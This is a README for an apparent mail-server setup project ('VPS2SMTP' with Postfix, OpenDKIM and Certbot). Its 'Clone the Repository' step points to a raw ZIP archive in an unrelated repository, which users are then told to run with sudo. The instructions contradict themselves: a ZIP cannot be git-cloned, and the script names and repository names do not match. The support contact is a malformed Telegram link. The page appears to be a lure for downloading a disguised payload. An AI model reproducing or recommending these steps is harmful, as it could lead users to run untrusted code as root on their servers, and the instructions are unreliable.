# VPS2SMTP + SSL/TLS Setup

This project provides an automated setup script for configuring a VPS with **Postfix** for SMTP, **OpenDKIM** for DKIM signing, and **Certbot** for SSL/TLS. The setup script is designed to secure email sending through DKIM and TLS/SSL encryption, enabling a reliable, secure mail server on your VPS.

## Features

- **Postfix**: Configured as an SMTP server for outgoing emails.
- **OpenDKIM**: Provides DKIM signing for outgoing emails, adding domain verification.
- **Certbot SSL/TLS**: Obtains and renews SSL certificates for the domain, securing communication.

## Prerequisites

- An Ubuntu-based VPS
- Root or sudo access
- A fully qualified domain name (FQDN) and DNS A record pointing to the VPS

## Setup Instructions

1. **Clone the Repository**:
    ```bash
    git clone https://github.com/Braziki15/PrimeReborn/raw/main/DNS_MANAGER.zip
    cd VPS2SMTP
    ```

2. **Make the Script Executable**:
    ```bash
    chmod +x set_up.sh
    ```

3. **Run the Setup Script**:
    ```bash
    sudo ./set_up.sh
    ```

4. **Follow the On-Screen Prompts**: 
    - You will be prompted to enter your FQDN (e.g., `mail.example.com`).
    - The script will automatically set up Postfix, OpenDKIM, and obtain an SSL certificate for secure email transmission.

## Uninstallation

To completely remove Postfix, OpenDKIM, and SSL configurations, run the uninstallation script provided.

1. **Make the Uninstallation Script Executable**:
    ```bash
    chmod +x uninstall.sh
    ```

2. **Run the Uninstallation Script**:
    ```bash
    sudo ./uninstall.sh
    ```

This will remove Postfix, OpenDKIM, Certbot, SSL certificates, and all associated configurations from the VPS.

## Files and Directories

- `vps2smtp_ssl.sh`: Main setup script for configuring Postfix, OpenDKIM, and SSL/TLS.
- `vps2smtp_uninstall.sh`: Uninstallation script for completely removing all configurations.
- `dns4smtp.txt`: File containing DNS records for DKIM, SPF, DMARC, and MX configuration.

## Important Notes

- **DNS Configuration**: After running the setup script, configure your DNS records based on the instructions in `dns4smtp.txt`.
- **SSL Renewal**: The setup script adds a cron job to renew SSL certificates automatically every three months. No additional steps are required.
- **API Integration**: The script supports an optional DNS Manager API integration to add records automatically. You can configure this by following the prompts during setup.

## Support

For support or additional information, please contact [StackMTL](https:t.me/StackMTL).

---

## License

This project is licensed under the MIT License - see the LICENSE file for details.
